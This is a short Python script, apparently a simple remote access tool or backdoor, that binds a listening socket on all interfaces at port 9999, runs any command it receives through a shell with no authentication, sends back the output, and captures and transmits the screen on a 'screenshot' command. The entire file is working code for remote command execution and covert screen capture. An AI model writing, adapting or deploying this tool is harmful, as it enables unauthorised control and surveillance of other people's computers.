import socket
import subprocess
import pyautogui
import io
from PIL import Image

def capture_screen():
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='JPEG')
    return img_bytes.getvalue()

def start_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[*] Accepted connection from {addr}")

        while True:
            try:
                command = client_socket.recv(1024).decode()
                if command.lower() == 'exit':
                    print("[*] Connection closed")
                    break
                
                if command.lower() == 'screenshot':
                    # 화면 캡처 요청
                    img_data = capture_screen()
                    client_socket.sendall(b'IMAGE ' + len(img_data).to_bytes(4, 'little') + img_data)
                else:
                    # Execute the command and get the output
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client_socket.send(output)
            except Exception as e:
                print(f"Error: {e}")
                client_socket.send(str(e).encode())

        client_socket.close()

if __name__ == "__main__":
    start_server()